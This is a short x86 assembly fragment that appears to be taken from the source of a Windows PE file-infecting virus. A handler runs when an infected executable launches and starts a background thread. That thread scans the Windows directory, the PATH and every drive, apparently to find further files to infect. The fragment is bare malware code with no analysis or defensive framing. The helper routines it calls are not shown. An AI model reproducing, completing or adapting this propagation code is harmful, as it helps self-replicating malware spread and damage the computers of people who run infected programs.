
; onexec() handler
; called when an infected PE file is executed

onexec:                 pusha

                        push    ecx
                        push    esp
                        push    0
                        push    0
                        pusho   threadfunc
                        push    256*1024
                        push    0
                        call    xxCreateThread
                        pop     ecx

                        popa
                        ret

threadfunc:             pusha

                        seh_init

                        call    scanner

                        seh_done

                        popa
                        ret

scanner:
                        lea     edi, ff

                        call    process_windir  ; %windir%
                        call    process_path    ; PATH
                        call    process_drives  ; all other files

                        ret
